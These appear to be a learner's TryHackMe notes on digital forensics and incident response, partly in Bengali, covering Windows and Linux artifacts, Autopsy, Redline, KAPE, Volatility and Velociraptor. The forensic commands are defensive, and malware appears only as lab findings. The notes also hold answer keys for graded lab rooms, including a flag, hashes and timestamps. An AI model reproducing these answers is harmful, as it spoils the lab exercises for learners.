# TryHackMe Progress & Learning Notes
DFIR + Forensics Summary (Short & Simple)
DAY 1
DFIR & Windows Forensics —
Introduction on DFIR
🔹 Overview
This document provides a concise summary of the key concepts learned in DFIR (Digital Forensics and Incident Response), essential forensic tools, the PICERL incident response model, and an introduction to Windows forensic artifacts.
It is formatted for technical documentation and GitHub usage.

## Digital Forensics & Incident Response (DFIR)
What is DFIR?

DFIR combines Digital Forensics and Incident Response to:

Collect and preserve digital evidence

Analyze attacker activity

Respond to and recover from security incidents

Forensic Artifacts

Artifacts are traces left behind by user or attacker activity, collected from:

File system

RAM

Network traffic

System logs

## Evidence Preservation Principles
1. Write Protection

Original evidence must never be modified. A write-protected version is kept intact while analysis is performed on a copy.

2. Chain of Custody

A documented record of who handled the evidence at every stage. Prevents contamination and ensures legal validity.

3. Order of Volatility

Collect evidence from most volatile → least volatile sources:

RAM

Running processes

Network connections

Disk storage

4. Timeline Creation

Events are arranged chronologically to reconstruct the attacker’s actions and understand the full scope of the incident.

## Essential DFIR Tools
Eric Zimmerman Tools

A suite of Windows forensic tools for registry analysis, timelines, file metadata, prefetch files, event logs, etc.

KAPE (Kroll Artifact Parser & Extractor)

Automates artifact collection

Parses Windows evidence

Quickly builds forensic timelines

Autopsy

An open-source forensic suite used for:

Disk analysis

File recovery

Timeline generation

Mobile & external media investigations

Volatility

Industry-standard framework for RAM/memory analysis:

Detects malware

Extracts processes

Analyzes system memory artifacts

Redline

FireEye’s incident response tool for:

Collecting system forensic data

Analyzing malicious activity

Velociraptor

Powerful open-source platform for:

Endpoint monitoring

Artifact collection at scale

Enterprise forensics and threat hunting

## Incident Response (IR) Process — PICERL

The IR process is commonly represented by the PICERL acronym (SANS).
NIST’s IR model is equivalent, with slight naming differences.

1. Preparation

Tools, teams, policies, and monitoring systems must be ready before an incident occurs.

2. Identification

Detect the incident using alerts, logs, and indicators.
Verify true vs false positives.

3. Containment

Limit the spread and impact of the threat.
Includes short-term isolation and long-term strategic fixes.

4. Eradication

Remove the threat entirely from the network:

Delete malware

Disable compromised accounts

Close attacker entry points

5. Recovery

Restore services, rebuild systems, and return to normal operations.

6. Lessons Learned (NIST: Post-Incident Activity)

Review the incident, document findings, and update defenses to prevent future recurrence.

## Introduction to Windows Forensics
Why Windows Forensics Matters

Windows holds over 80% of the desktop OS market

Crucial for corporate investigations and incident response

Windows creates rich user activity artifacts, excellent for forensic analysis

Windows Artifact Sources

Windows stores forensic artifacts in:

Registry

User profile directories

Application data folders

Browser databases

System logs

Is Windows “spying” on users?

Not intentionally.
Windows stores user preferences and activity to enhance the user experience, but forensic analysts use these same artifacts as evidence during investigations.

##  Summary of What You Learned

Fundamentals of DFIR

Importance of proper evidence handling

Why timelines matter in investigations

Key forensic and IR tools (Eric Zimmerman, KAPE, Autopsy, Volatility, Redline, Velociraptor)

PICERL incident response process

Windows forensic artifacts and their role in tracking system activity

DAY 2

Windows Forensics 1 – DFIR Notes & Answers

(TryHackMe Learning Summary)

📌 Overview

This repository documents my hands-on learning from the Windows Forensics 1 room on TryHackMe, focusing on registry-based forensic artifacts, user activity, program execution, and USB forensics using real triage data.

🔍 Topics Covered
1️⃣ System Information (Registry)

OS Version & Build Number

Control Sets & Last Known Good

Computer Name

Time Zone Information

Important Registry Paths

SOFTWARE\Microsoft\Windows NT\CurrentVersion
SYSTEM\Select
SYSTEM\CurrentControlSet

2️⃣ User & Account Information

User-created accounts

Last logon time

Password hint

RID identification

Registry Path

SAM\Domains\Account\Users
SAM\Domains\Account\Users\Names

3️⃣ User Activity Artifacts

Recently opened files

File extensions (.txt, .pdf, etc.)

Explorer interaction

Open/Save dialogs

Registry Paths

NTUSER.DAT\...\Explorer\RecentDocs
NTUSER.DAT\...\ComDlg32
NTUSER.DAT\...\TypedPaths

4️⃣ Program Execution Evidence

GUI-based execution

Background execution

Installed & executed binaries

Artifact	Purpose
UserAssist	GUI app execution
ShimCache	Executed binaries
AmCache	Full path + SHA1
BAM/DAM	Background execution

Key Locations

NTUSER.DAT\...\UserAssist
SYSTEM\...\AppCompatCache
C:\Windows\AppCompat\Programs\Amcache.hve

5️⃣ USB Forensics

Connected USB devices

Manufacturer & serial number

Friendly name

First & last connection time

Registry Paths

SYSTEM\CurrentControlSet\Enum\USBSTOR
SOFTWARE\Microsoft\Windows Portable Devices\Devices

✅ Questions & Final Answers
🔹 System & Registry

Current Build Number: 19044

Last Known Good ControlSet: ControlSet001

Computer Name: THM-4n6

TimeZoneKeyName: Pakistan Standard Time

DHCP IP Address: 192.168.100.58

🔹 Accounts

RID of Guest Account: 501

User-created accounts: 3

User never logged in: thm-user2

Password hint (THM-4n6): 123

🔹 User Activity

EZtools opened: 2021-12-01 13:00:34

My Computer last interacted: 2021-12-01 13:06:47

Notepad opened file path:

C:\Program Files\Amazon\Ec2ConfigService\settings


File opened time: 2021-11-30 10:56:19

Changelog.txt accessed: 2021-11-25 03:42:53

🔹 Program Execution

File Explorer launched: 26 times

Another name of ShimCache: Application Compatibility Cache

Artifact storing SHA1 hashes: AmCache

Artifact storing full execution path: AmCache

Python 3.8.2 installer run from:

C:\Users\THM-4n6\Downloads\python-3.8.2.exe

🔹 USB Forensics

USB Manufacturer: Kingston

Serial Number: 1C6f654E59A3B0C179D366AE&0

Device Name: Kingston DataTraveler 2.0 USB Device

Friendly Name: USB

Last connected time: 2021-11-24 18:18:48

🎯 Skills Gained

Registry-based forensic analysis

User activity reconstruction

Program execution tracking

USB device investigation

DFIR triage methodology

🚀 Tools Used

Registry Explorer

AmCache Parser

ShimCache Parser

ShellBags Explorer

EZTools (Eric Zimmerman)

🏁 Status

✅ Windows Forensics 1 – COMPLETED

 
 Day 3
Windows Forensics 2

(File System, Execution Evidence, USB & File Recovery)

📌 Overview

In Windows Forensics 2, we move beyond the Windows Registry and analyze file system–based forensic artifacts.
This day focuses on identifying:

Evidence of program execution

File & folder access (knowledge)

External device / USB usage

Deleted file recovery

NTFS & FAT forensic artifacts using Eric Zimmerman tools and Autopsy

🗂️ File Systems in Windows
🔹 FAT File System

Variants: FAT12, FAT16, FAT32

Commonly used in:

USB drives

SD cards

Digital cameras

Type	Addressable Bits	Max File Size
FAT32	28 bits	4 GB – 1 byte

📌 Limitation: No journaling, weak forensic reliability

🔹 exFAT

Designed for large removable media

Used by digital cameras & SD cards

Supports:

Huge file sizes

Large volumes

Lightweight compared to NTFS

🔹 NTFS (Most Important)

Introduced with Windows NT, NTFS provides:

Journaling

Access controls

File recovery support

Advanced forensic artifacts

Key NTFS Artifacts:
File	Purpose
$MFT	Master File Table – tracks all files
$LogFile	NTFS transaction log
$UsnJrnl	File change journal
$Boot	Volume boot information
🧰 Tools Used (Eric Zimmerman Suite)
Tool	Purpose
MFTECmd	Parse $MFT
PECmd	Parse Prefetch files
WxTCmd	Parse Windows 10 Timeline
JLECmd	Parse Jump Lists
LECmd	Parse Shortcut (.lnk) files
EZViewer	View CSV outputs
Autopsy	Deleted file recovery & browser artifacts
🧠 Evidence of Execution (Task 5)
🔹 Windows Prefetch

Location:

C:\Windows\Prefetch


Contains:

Last execution time

Run count

Executed program name

Files used by program

Command:

PECmd.exe -d "C:\Windows\Prefetch" --csv output_folder


📌 Prefetch = Strong evidence of execution

🔹 Windows 10 Timeline

Location:

C:\Users\<user>\AppData\Local\ConnectedDevicesPlatform\*\ActivitiesCache.db


Parsed using:

WxTCmd.exe -f ActivitiesCache.db --csv output_folder


📌 Shows:

Application execution

Focus time

File interaction

🔹 Jump Lists

Location:

C:\Users\<user>\AppData\Roaming\Microsoft\Windows\Recent\AutomaticDestinations


Parsed using:

JLECmd.exe -d <path> --csv output_folder


📌 Shows:

Programs executed

Recently opened files

First & last execution time

📁 File / Folder Knowledge (Task 6)
🔹 Shortcut Files (.lnk)

Locations:

Recent\
Office\Recent\


Parsed using:

LECmd.exe -d <path> --csv output_folder


📌 Evidence:

First opened time → .lnk created

Last accessed time → .lnk modified

Original file path

USB volume details (if removable)

🔹 IE / Edge WebCache

Location:

WebCacheV*.dat


Includes local file access

Files appear as:

file:///C:/...


Parsed using Autopsy with:

Logical Files

Recent Activity module

🔌 External Devices / USB Forensics (Task 7)
🔹 setupapi.dev.log (MOST IMPORTANT)

Location:

C:\Windows\inf\setupapi.dev.log


📌 Contains:

USB device serial number

First connection time

Last connection time

Search keyword:

USBSTOR

🔹 Shortcut Files (USB Evidence)

Shortcut files can reveal:

USB volume name

Volume serial number

Drive type (Removable)

📌 Correlates USB usage with file access

🗑️ Deleted Files & Recovery
🔹 Disk Image Concept

Bit-by-bit copy of storage

Preserves metadata

Enables forensic analysis without altering evidence

🔹 Recovering Deleted Files using Autopsy

Steps:

Create new case

Add data source → Disk Image

Select image (usb.001)

Disable ingest modules (for speed)

Navigate:

File Views → Deleted Files


Right-click → Extract File(s)

📌 Deleted files are marked with ❌

🧪 Key Forensic Takeaways
Artifact	Evidence
Prefetch	Program execution
Timeline	App usage history
Jump Lists	File & app access
Shortcut (.lnk)	File knowledge
setupapi.dev.log	USB connection
$MFT	File existence & metadata
🏁 Conclusion

Windows Forensics 2 demonstrates how file system artifacts provide powerful forensic evidence even without registry access.
By correlating Prefetch, Timeline, Jump Lists, Shortcut files, and setupapi logs, an investigator can reliably reconstruct user activity, execution history, file access, and USB usage.
Windows Forensics 2 – COMPLETED

 Day 4
 🐧 Linux Forensics 

(System Configuration, Persistence, Execution & Logs)

📌 Overview

Day 3 of Linux Forensics focuses on identifying system configuration, persistence mechanisms, evidence of execution, and log file analysis on a Linux host.
Unlike Windows, Linux stores forensic artifacts primarily in files and logs, making file system knowledge critical for investigations.

🖥️ System Configuration & Host Information
🔹 Hostname

Location

/etc/hostname


Command

cat /etc/hostname


Answer

Linux4n6

🔹 Timezone

Location

/etc/timezone


Command

cat /etc/timezone


Answer

Asia/Karachi

🔹 Network Interfaces & IP Information

Static config

/etc/network/interfaces


Live system

ip address show


Artifacts obtained:

Interface name

IP address

MAC address

🔹 Active Network Connections

Command

netstat -natp


Question

What program is listening on 127.0.0.1:5901?

Answer

Xtigervnc

🔹 Running Process Path

Command

ps aux


Question

What is the full path of this program?

Answer

/usr/bin/Xtigervnc

🔐 Persistence Mechanisms

Persistence mechanisms allow programs or malware to survive system reboots.

🔹 Cron Jobs

Location

/etc/crontab


Command

cat /etc/crontab


Used for:

Scheduled execution

Malware persistence via hidden scripts

🔹 Startup Services

Location

/etc/init.d/


Command

ls /etc/init.d/


Services listed here automatically start during boot.

🔹 Bash Startup Files

User-level persistence

~/.bashrc


System-wide

/etc/bash.bashrc
/etc/profile


Attackers often insert malicious commands here.

❓ Question

In the bashrc file, the size of the history file is defined.
What is the size of the history file set for the user Ubuntu?

Answer

2000

▶️ Evidence of Execution
🔹 Sudo Execution History

Location

/var/log/auth.log


Command

cat /var/log/auth.log* | grep -i COMMAND


Records:

sudo commands

Working directory (PWD)

Executed binary

❓ Question 1

The user tryhackme used apt-get to install a package.
What command was issued?

Answer

sudo apt-get install apache2

❓ Question 2

What was the current working directory when the command to install net-tools was issued?

Answer

/home/ubuntu

🔹 Bash History

Location

~/.bash_history


Contains:

Non-sudo commands

File and directory operations

🔹 Vim File Access

Location

~/.viminfo


Provides:

Files opened in Vim

Command & search history

Timestamps

📜 Log Files Analysis

Log files are stored in:

/var/log/

🔹 Syslog

Location

/var/log/syslog*


Command

cat /var/log/syslog* | head


Contains:

System events

Cron jobs

Service activity

🔹 Authentication Logs

Location

/var/log/auth.log*


Contains:

User creation

Group assignments

sudo activity

Login attempts

🔹 Third-Party Application Logs

Examples:

/var/log/apache2/
/var/log/samba/
/var/log/openvpn/


Apache logs:

access.log

error.log

❓ Question

The machine previously had a different hostname.
What was the previous hostname?

Answer

tryhackme

🧠 Key Forensic Takeaways
Artifact	Evidence Provided
/etc/passwd	User accounts & UID
/etc/group	Group membership
auth.log	Sudo & authentication
syslog	System & service events
crontab	Scheduled persistence
.bashrc	User-level persistence
.bash_history	Command execution
.viminfo	File access evidence
🏁 Summary

Linux Forensics relies heavily on log analysis, configuration files, and user artifacts rather than a centralized registry.
By correlating data from system configuration files, persistence mechanisms, execution history, and logs, investigators can accurately reconstruct user activity and system behavior over time.

Day 5
🧪 Digital Forensics with Autopsy 
📌 Overview

Day 5 focuses on learning and applying Autopsy, an open-source digital forensics platform widely used in law enforcement, DFIR teams, and corporate investigations.
This day covers workflow, data sources, ingest modules, user interface, visualization tools, reporting, and real-world data analysis using a mini investigation scenario.

🧠 What is Autopsy?

Autopsy is a powerful, GUI-based digital forensics platform built on The Sleuth Kit.

Key Features

Disk image & VM analysis

Plug-in based architecture (Ingest Modules)

Timeline & visualization tools

Keyword search & artifact correlation

Report generation (HTML/CSV)

Used by:

Law enforcement

National security

Corporate incident response teams

🔁 Autopsy Workflow (Core Concept)

Every Autopsy investigation follows this workflow:

Create / Open Case

Add Data Source

Configure Ingest Modules

Review Extracted Artifacts

Generate Report

🔑 Always review Data Source Summary first before deep analysis.

📂 Case Management
🔹 Case File Extension
.aut

Case Types

Single-User (used in this room)

Multi-User (server-based)

💽 Data Sources in Autopsy
Supported Disk Image Formats
Type	Examples
Raw Single	.img, .dd, .raw, .bin
Raw Split	.001, .002, .aa, .ab
EnCase	.e01, .e02, .e03
Virtual Machines	.vmdk, .vhd

📌 For split images, only the first file (e.g., .e01) is required.

❓ Q&A

What is the disk image name of the "e01" format?
✅ Answer: EnCase

⚙️ Ingest Modules

Ingest Modules are Autopsy plug-ins that extract specific forensic artifacts.

Examples

Interesting Files Identifier

Keyword Search

Recent Activity

Web Artifacts

Deleted Files

Execution Options

During data source addition

After data source is added (Right-click → Run Ingest Modules)

📌 Results appear under the Results node in Tree Viewer.

🖥️ User Interface – Part I
5 Main UI Areas
1️⃣ Tree Viewer

Top-level nodes:

Data Sources

Views

Results

Tags

Reports

2️⃣ Result Viewer

Tabs:

Table

Thumbnail

Summary

Allows file extraction and artifact review.

3️⃣ Views

Files categorized by:

Extension

MIME Type

Deleted Files

File Size

🔥 MIME Type is more reliable than file extension.

4️⃣ Contents Viewer

Shows detailed file metadata.

Columns:

S (Score) → Notable / Suspicious

C (Comment)

O (Occurrence) (Central Repository)

5️⃣ Status Area

Ingest progress

Alerts

Cancel option

❓ Q&A

Number of Data Sources: 4

Detected Removed Files: 10

Interesting File Name: googledrivesync.exe

🧾 User Interface – Part II (Summary & Reporting)
Data Source Summary

Provides high-level overview:

OS version

File types

Deleted files

User activity

Interesting files

Report Generation

Supported formats:

HTML

CSV

📌 Reports allow offline analysis without Autopsy GUI.

❓ Q&A

OS Version: Windows 7 Ultimate Service Pack 1

Documents Percentage: 40.8%

Interesting Files Identifier Job Number: 10

🕵️ Task 7 – Data Analysis (Mini Scenario)
Scenario

An employee is suspected of leaking company data.
Disk image metadata was analyzed using Autopsy.

Key Findings
Evidence	Finding
Installed Program	Eraser (Anti-forensics tool)
Password Hint	IAMAN
Network Access	SECRET files from 10.11.11.128
Web Searches	information leakage cases
Timed Search	anti-forensic tools
Suspicious Binary MD5	fe18b02e890f7a789c576be8abccdc99
Sticky Note	Tomorrow...Everything will be OK...
❓ Q&A (All Correct)

Installed Program → Eraser

Password Hint → IAMAN

Network IP → 10.11.11.128

Top Search Term → information leakage cases

Timed Search → anti-forensic tools

MD5 Hash → fe18b02e890f7a789c576be8abccdc99

Sticky Note Message → Tomorrow...Everything will be OK...

⏳ Visualization Tools – Timeline

Timeline is the most powerful visualization tool in Autopsy.

Components

Filters

Events

File / Content details

View Modes

Counts

Details

List

Supports:

Clustering

Pin / Unpin

Hide / Unhide events

❓ Q&A

Events on 2015-01-12: 46

Highest Activity Date: March 25, 2015

🧠 Forensic Correlation Summary

Strong indicators of insider data leakage:

Anti-forensic tools installed

Research on data leakage & anti-forensics

Access to SECRET files over network

Suspicious binaries

Psychological stress indicators

🔴 Confidence Level: HIGH

📝 One-Line GitHub Summary

Day 5 focused on mastering Autopsy for digital forensics, covering case workflow, data sources, ingest modules, UI navigation, visualization through timelines, reporting, and a real-world insider data leakage investigation.

🏁 Day 5 Status

✅ COMPLETED – Autopsy (TryHackMe)

 Day 6
Redline 
Task 6: IOC Search Collector Analysis (Threat Hunting)
📌 Scenario Overview

Organization: Osinski Inc.
Incident Type: Suspected intrusion
Attack Technique: Lateral Movement – Pass-the-Hash (PtH)

The security team suspects:

An attacker planted a malicious file

Tool used for lateral movement

File was masqueraded

Only partial indicators were initially known

🎯 Goal:
Identify the planted malicious file using IOC-based threat hunting with Redline.

🧠 Initial Intelligence (Known Artifacts)

Only the following IOCs were provided:

File Strings
20210513173819Z0w0=
<?<L<T<g=

File Size
834936 bytes


📌 No filename
📌 No hash
📌 No path

➡️ Classic threat hunting scenario with limited intel.

🛠️ Tools & Data Used

FireEye Redline

IOC Search Collector

Existing analysis session

📂 Session Location:

C:\Users\Administrator\Documents\Analysis\Sessions\AnalysisSession1

🔎 Investigation Approach (How the Hunt Was Done)

Created IOC using:

File strings

File size

Loaded existing .mans session in Redline

Executed IOC Search analysis

Filtered files matching all artifacts

Validated:

File path

Owner

Subsystem

Device path

Hash

Correlated hash with known attacker tools

🚨 Findings (Malicious File Identified)
✅ Full File Path (Including Filename)
C:\Users\Administrator\AppData\Local\Temp\8eJv8w2id6IqN85dfC.exe


📌 Temp directory → common attacker drop location
📌 Random filename → masquerading technique

✅ Directory Path Only
C:\Users\Administrator\AppData\Local\Temp\

✅ File Owner
BUILTIN\Administrators


⚠️ Indicates execution with administrative privileges

✅ Subsystem
Windows_CUI


📌 Command-line executable
📌 Common for lateral movement tools

✅ Device Path
\Device\HarddiskVolume2

✅ SHA-256 Hash
57492d33b7c0755bb411b22d2dfdfdf088cbbfcd010e30dd8d425d5fe66adff4

🎭 Masquerading Detection

Using hash correlation and known tool signatures:

🔴 Real Filename Identified
PsExec.exe

🧠 Why This Matters (Analyst Insight)

PsExec.exe is a legitimate Sysinternals tool

Frequently abused by attackers for:

Lateral movement

Pass-the-Hash attacks

Remote command execution

Masquerading helps evade:

AV detection

Casual inspection

📌 Context + behavior = malicious intent confirmed

❓ Questions & Answers
Question	Answer
Full file path	C:\Users\Administrator\AppData\Local\Temp\8eJv8w2id6IqN85dfC.exe
Directory path	C:\Users\Administrator\AppData\Local\Temp\
File owner	BUILTIN\Administrators
Subsystem	Windows_CUI
Device path	\Device\HarddiskVolume2
SHA-256 hash	57492d33b7c0755bb411b22d2dfdfdf088cbbfcd010e30dd8d425d5fe66adff4
Real filename	PsExec.exe
🧠 Key Takeaways (Day 6)

IOC hunting works even with partial indicators

File strings + file size are powerful together

Temp directories are attacker favorites

Masquerading is extremely common

PsExec is dual-use → intent matters

Contextual analysis is critical in DFIR

📝 GitHub Summary (Day 6)
### Day 6 – Redline IOC Search Collector Analysis

In this task, IOC-based threat hunting was conducted to identify a malicious executable used for lateral movement at Osinski Inc. Using limited indicators such as file strings and file size, a suspicious executable was discovered in the Temp directory. Further analysis revealed the file was masquerading under a random name but matched the SHA-256 hash of PsExec.exe, a tool commonly abused in Pass-the-Hash attacks. This task highlights the effectiveness of IOC-driven investigations and contextual analysis in incident response.

✅ Day 6 Status

✔ IOC-based Threat Hunting
✔ Masquerading Detection
✔ Lateral Movement Analysis
✔ Pass-the-Hash Context

Day 7 
KAPE (Kroll Artifact Parser and Extractor)

Platform: TryHackMe
Category: Windows Forensics | DFIR | Incident Response
Tool: KAPE
Author: Eric Zimmerman (Kroll)

🔍 Day 7 Overview

আগের Windows Forensics rooms (WF1, WF2)-এ আমরা manualভাবে artifacts analyze করেছি।
কিন্তু বাস্তব incident response-এ সময় সবচেয়ে বড় factor।

👉 KAPE এই সমস্যা solve করে by:

দ্রুত forensic artifacts collect করা

automated parsing করা

minimal user interaction-এ triage output দেওয়া

🎯 Learning Objectives (Day 7)

KAPE কী এবং কেন ব্যবহার করা হয়

Targets vs Modules বোঝা

Compound Targets & Modules

KAPE GUI ব্যবহার

KAPE CLI ও Batch Mode

Policy Violation Investigation (Hands-on)

🧠 What is KAPE?

KAPE (Kroll Artifact Parser and Extractor) একটি portable DFIR triage tool, যা:

Live system / mounted image থেকে artifacts collect করে

OS-locked files bypass করে (raw disk read)

Original timestamps ও metadata preserve করে

Eric Zimmerman forensic tools দিয়ে artifacts parse করে

⚡ Goal: Speed + Accuracy in Incident Response

🧩 Core Architecture
🔹 Targets

Targets define করে → কি collect করা হবে

Extension: .tkape

Examples:

Prefetch

Registry Hives

Event Logs

USB Artifacts

Browser Artifacts

🔸 Compound Targets

একাধিক targets একসাথে collect করার জন্য

Examples:

KapeTriage

!BasicCollection

!SANS_Triage

📌 Used for rapid triage

🔹 Modules

Modules define করে → collected data কীভাবে parse হবে

Extension: .mkape

Output: CSV / TXT / JSON

Mostly Eric Zimmerman tools

Examples:

PECmd → Prefetch

LECmd → LNK files

EvtxECmd → Event logs

RECmd → Registry

📁 bin directory

External executables রাখা হয় (EZ tools)

🖥️ KAPE GUI (gkape.exe)
Important GUI Options

✔️ Use Target Options

✔️ Target Source → C:\

✔️ Target Destination → Output folder

✔️ %d → Append Date & Time

✔️ %m → Append Machine Name

✔️ Use Module Options

Lab Configuration

Target: KapeTriage

Module: !EZParser

⌨️ KAPE CLI Usage
Basic Command
kape.exe --tsource C: --target KapeTriage --tdest C:\Users\thm-4n6\Desktop\Target --mdest C:\Users\thm-4n6\Desktop\Module --module !EZParser

Useful Variables
Variable	Description
%d	Timestamp
%m	Machine Name
%s	System Drive
📦 Batch Mode (_kape.cli)

Used when:

Non-technical user runs KAPE

SOC automation

IR playbooks

Example:

--tsource C: --target KapeTriage --tdest C:\Target --mdest C:\Module --module !EZParser

🕵️ Hands-on Investigation (Acceptable Use Policy Violation)
Findings

USB mass storage connected

Software installed from Network drive

Browser search artifacts

Network profiles recorded

KAPE copied from removable media

❓ Questions & Answers
🔌 USB Devices

Q: Other USB Serial Number?
✅ 1C6F654E59A3B0C179D366AE

📦 Software Installation

Q: Network drive path used for installs?
✅ Z:\Setups

▶️ Execution Evidence

Q: CHROMESETUP.EXE execution time?
✅ 11/25/2021 03:33

🔍 User Activity

Q: Search query executed?
✅ RunWallpaperSetup.cmd

🌐 Network Evidence

Q: Network 3 first connection time?
✅ 11/30/2021 15:44

💾 Removable Media

Q: Drive letter KAPE copied from?
➡️ Identified via USB + LNK + ShellBags artifacts

🧠 Analyst Notes (Exam + Real World)

KAPE = Collection + Parsing, not full analysis

Always preserve timestamps

Compound Targets save huge time

Ideal combo:

KAPE + Autopsy

KAPE + Redline

USB + Network installs = policy breach indicator

🏁 Day 7 Takeaway

KAPE is a must-know DFIR tool

Use KAPE when:

Ransomware suspected

Insider threat

USB misuse

Rapid triage needed

👉 Collect fast → Analyze smart

Day 8 –
Volatility (Memory Forensics)

Platform: TryHackMe
Category: Memory Forensics | Malware Analysis | DFIR
Tool: Volatility 3
Language: Python
Maintained by: Volatility Foundation

🔍 Day 8 Summary

Day 8-এ আমরা Memory Forensics শিখেছি, যেখানে মূল ফোকাস ছিল RAM (volatile memory) বিশ্লেষণ করা।
Disk forensics যেখানে historical evidence দেয়, সেখানে memory forensics live attacker activity প্রকাশ করে।

Volatility ব্যবহার করে আমরা:

Running processes

Network connections

Injected malware

Rootkits

Ransomware artifacts

সবকিছু memory dump থেকে বিশ্লেষণ করেছি।

🎯 Learning Objectives

Volatility কী এবং কেন গুরুত্বপূর্ণ

Memory dump কীভাবে collect করা হয়

Volatility 3 plugin architecture

Process & network enumeration

Malware hunting techniques

Advanced rootkit detection

Real-world memory investigations

🧠 What is Volatility?

Volatility হলো একটি open-source memory forensics framework যা RAM dump থেকে digital artifacts extract করে।

Key Features

OS-independent analysis

Plugin-based architecture

Windows / Linux / macOS support

SOC, DFIR ও Malware Analysts দ্বারা ব্যবহৃত

💾 Memory Acquisition Methods
Bare-Metal Systems

FTK Imager

Redline

DumpIt

win32dd / win64dd

Memoryze

Virtual Machines
Hypervisor	Memory File
VMware	.vmem
Hyper-V	.bin
Parallels	.mem
VirtualBox	.sav (partial)

⚠️ Memory extraction সবসময় সতর্কতার সাথে করতে হয়।

⚙️ Volatility Installation (Lab)

Python 3

Volatility 3

Optional:

yara-python

capstone

Test command:

python3 vol.py -h

🧩 Volatility 3 Plugin Structure

Volatility 3-এ profiles আর ব্যবহার হয় না।
OS অনুযায়ী plugin prefix ব্যবহার হয়:

OS	Prefix
Windows	windows.*
Linux	linux.*
macOS	mac.*

Example:

python3 vol.py -f memory.raw windows.info

🔎 System Information Extraction
python3 vol.py -f memory.raw windows.info


Provides:

OS version

Build number

Architecture

Kernel details

⚙️ Process Enumeration
Process Listing Plugins
Plugin	Purpose
pslist	Active & terminated processes
psscan	Hidden / unlinked processes
pstree	Parent-child process view

Commands:

windows.pslist
windows.psscan
windows.pstree

🌐 Network Enumeration
windows.netstat


Shows:

Active connections

Listening ports

Suspicious IPs

📦 DLL Analysis
windows.dlllist


Used for:

Injected DLL detection

Malware behavior analysis

🕵️ Malware Hunting
🔥 malfind (Code Injection Detection)
windows.malfind


Detects:

Fileless malware

RWE / RX memory regions

Injected shellcode

MZ headers in memory

🧬 YARA Scanning
windows.yarascan


Used for:

Known malware patterns

Threat intelligence matching

🧠 Advanced Memory Forensics
Rootkit Detection

Common Hooking Techniques:

SSDT

IRP

IAT / EAT

Inline hooks

SSDT scan:

windows.ssdt

Kernel Drivers
Plugin	Purpose
modules	Loaded kernel modules
driverscan	Hidden / unlinked drivers

Commands:

windows.modules
windows.driverscan

🧪 Practical Investigations
🧾 Case 001 – BOB! THIS ISN’T A HORSE!

Scenario: Banking trojan disguised as Adobe file
Memory File: Investigation-1.vmem

Findings
Question	Answer
OS Build Version	2600.xpsp.080413-2111
Memory Acquisition Time	2012-07-22 02:45:08
Suspicious Process	reader_sl.exe
PID	1640
Parent Process	explorer.exe
Parent PID	1484
User-Agent	Mozilla/5.0 (MSIE 7.0)
Suspicious IP	41.168.5.140
Chase Bank Domain Found	Yes

📌 Conclusion: Banking trojan active in memory

🧾 Case 002 – That Kind of Hurt My Feelings

Scenario: Ransomware post-incident analysis
Memory File: Investigation-2.raw

Findings
Question	Answer
Suspicious Process	@WanaDecryptor@
PID	740
Binary Path	C:\Intel\ivecuqmanpnirkt615@WanaDecryptor@.exe

Parent Process	tasksche.exe
Parent PID	1940
Malware Identified	WannaCry
DLL for Socket	Ws2_32.dll
Mutex	MsWinZonesCacheCounterMutexA
Plugin to Find Files	windows.filescan

📌 Conclusion: WannaCry ransomware confirmed

📝 Analyst Notes

Malware disk-এ না থাকলেও RAM-এ থাকতে পারে

psscan > pslist for hidden processes

malfind is critical for fileless malware

Rootkits require kernel-level inspection

Memory forensics is SOC & DFIR essential skill

🏁 Key Takeaways (Day 8)

✔ Volatility = industry standard memory forensics tool
✔ RAM analysis reveals live attacker behavior
✔ Fileless malware detection সম্ভব
✔ Advanced threats disk tools এড়িয়ে যায়

Day 9
Velociraptor – Endpoint DFIR & Threat Hunting

TryHackMe | Forensics Series | Day 9

📌 Summary (Short Overview)

Velociraptor একটি advanced open-source endpoint forensics & incident response platform, যা DFIR professionals দ্বারা তৈরি।
এটি large-scale endpoint fleet-এ দ্রুত artifact collection, live response, threat hunting এবং detection করার জন্য ব্যবহৃত হয়।

Developer: Mike Cohen

Maintained by: Rapid7

Core Strength: VQL (Velociraptor Query Language)

Use Cases:

Endpoint Forensics

Live Response

Threat Hunting

Malware & Exploit Detection (PrintNightmare etc.)

🎯 Learning Objectives

এই room শেষ করার পর তুমি শিখবে:

Velociraptor কী এবং কীভাবে কাজ করে

Server ↔ Client architecture

Client interrogation ও artifact collection

Virtual File System (VFS)

VQL basics (SELECT, FROM, WHERE)

Artifact creation

PrintNightmare vulnerability hunting

🏗️ Velociraptor Architecture (Explanation)

Velociraptor একটি single binary tool, যা ৩ভাবে কাজ করতে পারে:

Server

Client (Agent)

Instant Velociraptor (Standalone GUI)

🔹 Supported OS

Windows

Linux

macOS

🔹 Lab Setup (TryHackMe)

Server: Ubuntu (WSL)

Client: Windows

Web UI: https://127.0.0.1:8889

🔹 Instant Velociraptor Launch
velociraptor.exe gui

🖥️ Client Interaction & Investigation
🔹 Client Identification

Velociraptor hostname নয়, Client ID (C.xxxxx) দিয়ে endpoint track করে।

Client metadata:

Hostname

OS & Architecture

Agent Version

Last Seen IP & Time

Logged-in users

🧠 Velociraptor UI Breakdown
1️⃣ Overview

System information

OS, architecture, agent details

2️⃣ VQL Drilldown

CPU usage (Blue)

Memory usage (Orange)

Local users

Domain information

3️⃣ Shell (Live Response)

Remote command execution:

PowerShell

CMD

Bash

VQL

Example:

whoami


Output column:

Stdout

📦 Artifact Collection (Hands-on)
Artifact Used
Windows.KapeFiles.Targets

Parameter Enabled

✅ Ubuntu (WSL)

📌 Purpose:
Collect artifacts related to Ubuntu running inside Windows Subsystem for Linux

Result

Files collected: 19

State change:

⏳ Running → ✅ Completed

📂 Virtual File System (VFS)

VFS lets analysts remotely browse endpoint files.

🔹 VFS Accessors
Accessor	Description
file	OS-level file access
ntfs	Raw NTFS parsing (ADS, hidden files)
registry	Windows Registry access
artifacts	Previous collections
🔹 Findings

$Recycle.Bin → desktop.ini

Hidden flag in Admin Documents:

THM{VkVMT0NJUkFQVE9S}

🧬 Velociraptor Query Language (VQL)
🔹 VQL Structure
SELECT <columns>
FROM <plugin>
WHERE <filter>

Keyword	Meaning
SELECT	Column selectors
FROM	VQL plugin
WHERE	Filter condition
?	Autocomplete
Example
SELECT * FROM info()

Run PowerShell via VQL
execve()

🧩 Artifacts (VQL Modules)

Artifacts হলো:

YAML-based mini programs

Reusable VQL logic

Shareable via Artifact Exchange

👉 Analysts না বুঝলেও artifact run করতে পারে।

🔎 NTFS & Forensic Plugins
Purpose	Plugin
Parse MFT	parse_mft
